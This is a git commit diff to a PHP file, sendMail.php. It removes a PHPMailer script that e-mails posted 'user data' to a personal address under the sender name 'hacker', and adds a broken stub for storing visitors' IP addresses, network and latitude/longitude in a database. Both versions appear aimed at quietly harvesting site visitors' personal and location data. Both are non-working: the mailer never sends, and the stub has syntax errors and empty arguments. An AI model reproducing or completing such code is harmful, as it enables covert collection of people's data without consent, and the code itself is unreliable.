89d75079690648e927c9b88ea4556b7b1756d6e9
SYL <93049532+BoingNurik@users.noreply.github.com>
2024-03-20 23:41:10 +0500

    Update sendMail.php

--- sendMail.php
+++ sendMail.php
@@ -1,25 +1,3 @@
 <?php
-    use PHPMailer\PHPMailer\PHPMailer;
-    use PHPMailer\PHPMailer\Exception;
-
-    require 'PHPMailer/src/Exception.php';
-    require 'PHPMailer/src/PHPMailer.php';
-    
-    $mail = new PHPMailer(true);
-    $mail->CharSet = 'UTF-8';
-    $mail->setLanguage('ru', 'PHPMailer/language/');
-    $mail->isHTML(true);
-
-    $mail->setFrom("hacker@gmail.com", "Хакер-помощник");
-    $mail->addAddress("akkyevnurbek@gmail.com");
-    $mail->Subject = "Получены данные пользователя";
-    
-    $body = "<h1>Данные пользователя:</h1>";
-    $body.="<p>".$_POST['info']."</p>";
-   
-
-    $mail->Body = $body;
-    $response = ["message"=>"Успешно отправлено"];
-    header('Content-type: application/json');
-    echo json_encode($response);
-?>
+$db = mysqli_connect()    
+$query = "INSERT INTO userinfo (IP, network, latitude, longitude) VALUES()"
